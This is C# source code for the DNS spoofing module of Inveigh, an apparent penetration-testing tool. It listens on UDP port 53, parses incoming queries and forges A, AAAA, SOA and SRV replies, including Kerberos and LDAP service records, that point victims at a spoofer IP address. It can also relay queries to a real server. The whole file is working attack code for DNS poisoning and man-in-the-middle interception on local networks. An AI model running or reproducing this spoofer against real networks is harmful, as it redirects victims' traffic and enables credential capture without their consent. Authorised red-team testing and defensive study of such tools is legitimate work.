using System;
using System.Net;
using System.Net.Sockets;
using System.IO;

namespace Inveigh
{
    class DNS
    {

        public static void DNSListener(string ipVersion, string IP)
        {
            IPAddress listenerIPAddress = IPAddress.Any;
            string type = "DNS";

            if (String.Equals(ipVersion, "IPv6"))
            {
                listenerIPAddress = IPAddress.IPv6Any;
                type = "DNSv6";
            }

            IPEndPoint ipEndPoint = new IPEndPoint(listenerIPAddress, 53);
            IPAddress destinationIPAddress = IPAddress.Parse(IP);
            UdpClient udpClient = UDP.UDPListener("DNS", ipVersion, 53);

            while (!Program.exitInveigh)
            {

                try
                {
                    byte[] udpPayload = udpClient.Receive(ref ipEndPoint);
                    int sourcePortNumber = ipEndPoint.Port;
                    byte[] sourcePortData = Util.IntToByteArray2(sourcePortNumber);
                    IPAddress sourceIPAddress = ipEndPoint.Address;
                    sourceIPAddress = ipEndPoint.Address;
                    DNSReply("listener", ipVersion, sourcePortData, udpPayload, sourceIPAddress, destinationIPAddress, ipEndPoint, udpClient);
                }
                catch (Exception ex)
                {

                    lock (Program.outputList)
                    {
                        Program.outputList.Add(String.Format("[-] [{0}] DNS spoofer error detected - {1}", DateTime.Now.ToString("s"), ex));

                    }

                }

            }

        }

        public static void DNSReply(string method, string ipVersion, byte[] sourcePortData, byte[] payload, IPAddress sourceIPAddress, IPAddress destinationIPAddress, IPEndPoint ipEndPoint, UdpClient udpClient)
        {
            int sourcePortNumber = 0;
            string sourceIP = "";
            string responseStatus = "-";
            bool enabled = Program.enabledDNS;

            if (String.Equals(method, "sniffer"))
            {
                sourceIP = sourceIPAddress.ToString();
            }
            else
            {
                sourcePortNumber = ipEndPoint.Port;
                sourcePortData = Util.IntToByteArray2(sourcePortNumber);
                sourceIPAddress = ipEndPoint.Address;
                sourceIP = sourceIPAddress.ToString();
            }

            if (String.Equals(ipVersion, "IPv6"))
            {
                enabled = Program.enabledDNSv6;
            }

            string requestHost = Util.ParseNameQuery(12, payload);
            byte[] request = new byte[requestHost.Length + 2];
            Buffer.BlockCopy(payload, 12, request, 0, request.Length);
            byte[] type = new byte[2];
            Buffer.BlockCopy(payload, (request.Length + 12), type, 0, 2);
            string typeName = Util.GetRecordType(type);
            string responseMessage = Util.CheckRequest("DNS", requestHost, sourceIP, Program.argIP, typeName, Program.argDNSTypes, enabled);

            if (Program.enabledDNS && String.Equals(responseMessage, "response sent"))
            {
                responseStatus = "+";
                byte[] response = DNS.GetDNSResponse(method, ipVersion, Program.argDNSHost, typeName, sourceIPAddress, sourcePortData, payload);
                DNSClient(method, ipVersion, sourceIPAddress, sourcePortNumber, response, udpClient);
            }
            else if (Program.enabledDNSRelay && String.Equals(responseMessage, "DNS relay"))
            {
                byte[] serverResponse = DNSRelay(method, ipVersion, typeName, sourceIPAddress, payload, sourcePortData, ref responseMessage);

                if (!Util.ArrayIsNullOrEmpty(serverResponse))
                {
                    responseStatus = "+";
                    DNSClient(method, ipVersion, sourceIPAddress, sourcePortNumber, serverResponse, udpClient);
                }
                else
                {
                    responseStatus = "!";
                }

            }

            lock (Program.outputList)
            {
                Program.outputList.Add(String.Format("[{0}] [{1}] DNS({2}) request for {3} from {4} [{5}]", responseStatus, DateTime.Now.ToString("s"), typeName, requestHost, sourceIPAddress, responseMessage));
            }

        }

        public static void DNSClient(string method, string ipVersion, IPAddress sourceIPAddress, int sourcePortNumber, byte[] response, UdpClient udpClient)
        {

            if (String.Equals(method, "sniffer"))
            {
                UDP.UDPSnifferClient(ipVersion, 0, sourceIPAddress, sourcePortNumber, response); // todo check ports
            }
            else
            {
                UDP.UDPListenerClient(sourceIPAddress, sourcePortNumber, udpClient, response);
            }

        }

        public static byte[] DNSRelay(string method, string ipVersion, string typeName, IPAddress sourceIPAddress, byte[] payload, byte[] sourcePortData, ref string message)
        {
            byte[] relay = null;
            byte[] response = null;
            byte[] answer = new byte[4];

            try
            {
                IPEndPoint destinationEndpoint = new IPEndPoint(Program.dnsServerAddress, 53);
                UdpClient udpClient = new UdpClient();
                udpClient.Client.SendTimeout = 1500;
                udpClient.Client.ReceiveTimeout = 1500;
                udpClient.Connect(destinationEndpoint);
                udpClient.Send(payload, payload.Length);
                IPEndPoint ipEndPoint = new IPEndPoint(IPAddress.IPv6Any, 53);
                relay = udpClient.Receive(ref ipEndPoint);
                udpClient.Close(); 
                Buffer.BlockCopy(relay, 4, answer, 0, 4);         
            }
            catch
            {
                message = "DNS relay error";
                return response;
            }

            if (String.Equals(BitConverter.ToString(answer), "00-01-00-00"))
            {
                response = DNS.GetDNSResponse(method, ipVersion, Program.argDNSHost, typeName, sourceIPAddress, sourcePortData, payload);
                message = "response sent";
            }
            else if (String.Equals(method, "sniffer") && !Util.ArrayIsNullOrEmpty(relay))
            {
                MemoryStream memoryStream = new MemoryStream();
                memoryStream.Write((new byte[2] { 0x00, 0x35 }), 0, 2);
                memoryStream.Write(sourcePortData, 0, 2);
                memoryStream.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                memoryStream.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                memoryStream.Write(relay, 0, relay.Length);
               
                if (String.Equals(ipVersion, "IPv6"))
                {
                    byte[] pseudoHeader = Util.GetIPv6PseudoHeader(sourceIPAddress, 17, (int)memoryStream.Length);
                    UInt16 checkSum = Util.GetPacketChecksum(pseudoHeader, memoryStream.ToArray());
                    memoryStream.Position = 6;
                    byte[] checksumData = Util.IntToByteArray2(checkSum);
                    Array.Reverse(checksumData);
                    memoryStream.Write(checksumData, 0, 2);
                }

                response = memoryStream.ToArray();
                message = "relay response sent";
            }

            return response;
        }

        public static byte[] GetDNSResponse(string method, string ipVersion, string spooferHost, string type, IPAddress sourceIPAddress, byte[] sourcePortData, byte[] payload)
        {
            byte[] spooferIPData = Program.spooferIPData;
            byte[] TTL = BitConverter.GetBytes(Int32.Parse(Program.argDNSTTL));
            Array.Reverse(TTL);
            Array.Reverse(sourcePortData);
            byte[] transactionID = new byte[2];
            Buffer.BlockCopy(payload, 0, transactionID, 0, 2);
            string requestHost = Util.ParseNameQuery(12, payload);
            byte[] request = new byte[requestHost.Length + 2];
            Buffer.BlockCopy(payload, 12, request, 0, request.Length);
            string[] requestSplit = requestHost.Split('.');
            int headerLength = 0;
            string hostSplit = "";
            byte[] hostData = new byte[0];
            string hostDomain = "";
            int domainLocation = 12;
            int dcLocation = 0;
            byte[] hostFullData = new byte[0];

            if (!String.IsNullOrEmpty(spooferHost))
            {
                hostSplit = spooferHost.Split('.')[0];
                hostData = Util.NewDNSNameArray(hostSplit, false);
                hostDomain = spooferHost.Substring(hostSplit.Length + 1);
                hostFullData = Util.NewDNSNameArray(spooferHost, true);

                if (requestHost.EndsWith(hostDomain))
                {
                    domainLocation += requestHost.Length - hostDomain.Length;
                }

            }

            using (MemoryStream memoryStream = new MemoryStream())
            {

                if (String.Equals(method, "sniffer"))
                {
                    memoryStream.Write((new byte[2] { 0x00, 0x35 }), 0, 2);
                    memoryStream.Write(sourcePortData, 0, 2);
                    memoryStream.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                    memoryStream.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                    headerLength = 8;
                }

                if ((int)payload[2] != 40)
                {

                    switch (type)
                    {

                        case "A":
                            memoryStream.Write(transactionID, 0, transactionID.Length);
                            memoryStream.Write((new byte[10] { 0x80, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 }), 0, 10); // todo change back 80
                            memoryStream.Write(request, 0, request.Length);
                            memoryStream.Write((new byte[4] { 0x00, 0x01, 0x00, 0x01 }), 0, 4);
                            memoryStream.Write((new byte[2] { 0xc0, 0x0c }), 0, 2);
                            memoryStream.Write((new byte[4] { 0x00, 0x01, 0x00, 0x01 }), 0, 4);
                            break;

                        case "AAAA":
                            spooferIPData = Program.spooferIPv6Data;
                            memoryStream.Write(transactionID, 0, transactionID.Length);
                            memoryStream.Write((new byte[10] { 0x80, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 }), 0, 10);
                            memoryStream.Write(request, 0, request.Length);
                            memoryStream.Write((new byte[4] { 0x00, 0x1c, 0x00, 0x01 }), 0, 4);
                            memoryStream.Write((new byte[2] { 0xc0, 0x0c }), 0, 2);
                            memoryStream.Write((new byte[4] { 0x00, 0x1c, 0x00, 0x01 }), 0, 4);
                            break;

                        case "SOA":
                            memoryStream.Write(transactionID, 0, transactionID.Length);
                            memoryStream.Write((new byte[10] { 0x85, 0x80, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01 }), 0, 10);
                            memoryStream.Write(request, 0, request.Length);
                            memoryStream.Write((new byte[4] { 0x00, 0x06, 0x00, 0x01 }), 0, 4);
                            memoryStream.Write((new byte[2] { 0xc0, 0x0c }), 0, 2);
                            memoryStream.Write((new byte[4] { 0x00, 0x06, 0x00, 0x01 }), 0, 4);
                            memoryStream.Write(TTL, 0, 4);
                            memoryStream.Write(Util.IntToByteArray2(hostData.Length + 35), 0, 2);
                            dcLocation = (int)memoryStream.Length - headerLength;
                            memoryStream.Write(hostData, 0, hostData.Length);
                            memoryStream.Write((new byte[1] { 0xc0 }), 0, 1);
                            memoryStream.Write(BitConverter.GetBytes(domainLocation), 0, 1);
                            memoryStream.Write((new byte[11] { 0x0a, 0x68, 0x6f, 0x73, 0x74, 0x6d, 0x61, 0x73, 0x74, 0x65, 0x72 }), 0, 11);
                            memoryStream.Write((new byte[1] { 0xc0 }), 0, 1);
                            memoryStream.Write(BitConverter.GetBytes(domainLocation), 0, 1);
                            memoryStream.Write((new byte[4] { 0x00, 0x00, 0x06, 0x58 }), 0, 4);
                            memoryStream.Write((new byte[4] { 0x00, 0x00, 0x03, 0x84 }), 0, 4);
                            memoryStream.Write((new byte[4] { 0x00, 0x00, 0x02, 0x58 }), 0, 4);
                            memoryStream.Write((new byte[4] { 0x00, 0x01, 0x51, 0x80 }), 0, 4);
                            memoryStream.Write(TTL, 0, 4);
                            memoryStream.Write((new byte[1] { 0xc0 }), 0, 1);
                            memoryStream.Write(BitConverter.GetBytes(dcLocation), 0, 1);
                            memoryStream.Write((new byte[4] { 0x00, 0x01, 0x00, 0x01 }), 0, 4);
                            break;

                        case "SRV":
                            memoryStream.Write(transactionID, 0, transactionID.Length);
                            memoryStream.Write((new byte[10] { 0x85, 0x80, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01 }), 0, 10);
                            memoryStream.Write(request, 0, request.Length);
                            memoryStream.Write((new byte[4] { 0x00, 0x21, 0x00, 0x01 }), 0, 4);
                            memoryStream.Write((new byte[2] { 0xc0, 0x0c }), 0, 2);
                            memoryStream.Write((new byte[4] { 0x00, 0x21, 0x00, 0x01 }), 0, 4);
                            memoryStream.Write(TTL, 0, 4);
                            memoryStream.Write(Util.IntToByteArray2(hostFullData.Length + 6), 0, 2);
                            memoryStream.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                            memoryStream.Write((new byte[2] { 0x00, 0x65 }), 0, 2);

                            switch (requestSplit[0])
                            {

                                case "_kerberos":
                                    memoryStream.Write((new byte[2] { 0x00, 0x58 }), 0, 2);
                                    break;

                                case "_ldap":
                                    memoryStream.Write((new byte[2] { 0x01, 0x85 }), 0, 2);
                                    break;

                            }

                            dcLocation = (int)memoryStream.Length - headerLength;
                            memoryStream.Write(hostFullData, 0, hostFullData.Length);
                            memoryStream.Write((new byte[1] { 0xc0 }), 0, 1);
                            memoryStream.Write(BitConverter.GetBytes(dcLocation), 0, 1);
                            memoryStream.Write((new byte[4] { 0x00, 0x01, 0x00, 0x01 }), 0, 4);
                            break;
                    }

                    memoryStream.Write(TTL, 0, 4);
                    memoryStream.Write((new byte[2] { 0x00, 0x04 }), 0, 2);
                    memoryStream.Write(spooferIPData, 0, spooferIPData.Length);

                    if (String.Equals(method, "sniffer"))
                    {
                        memoryStream.Position = 4;
                        memoryStream.Write(Util.IntToByteArray2((int)memoryStream.Length), 0, 2);
                    }

                    if (String.Equals(method, "sniffer") && String.Equals(ipVersion, "IPv6"))
                    {
                        byte[] pseudoHeader = Util.GetIPv6PseudoHeader(sourceIPAddress, 17, (int)memoryStream.Length);
                        UInt16 checkSum = Util.GetPacketChecksum(pseudoHeader, memoryStream.ToArray());
                        memoryStream.Position = 6;
                        byte[] checksumData = Util.IntToByteArray2(checkSum);
                        Array.Reverse(checksumData);
                        memoryStream.Write(checksumData, 0, 2);
                    }

                }
                else
                {
                    byte[] flags = new byte[2] { 0xa8, 0x05 };
                    byte[] dnsPayload = new byte[payload.Length - 2]; // todo check this
                    Buffer.BlockCopy(payload, 2, dnsPayload, 0, dnsPayload.Length);
                    memoryStream.Write(payload, 0, payload.Length);

                    if (String.Equals(method, "sniffer"))
                    {
                        memoryStream.Position = 10;
                        memoryStream.Write(flags, 0, 2);
                        memoryStream.Position = 4;
                        memoryStream.Write(Util.IntToByteArray2((int)memoryStream.Length), 0, 2);
                    }
                    else
                    {
                        memoryStream.Position = 2;
                        memoryStream.Write(flags, 0, 2);
                    }

                }

                return memoryStream.ToArray();
            }

        }

    }

}
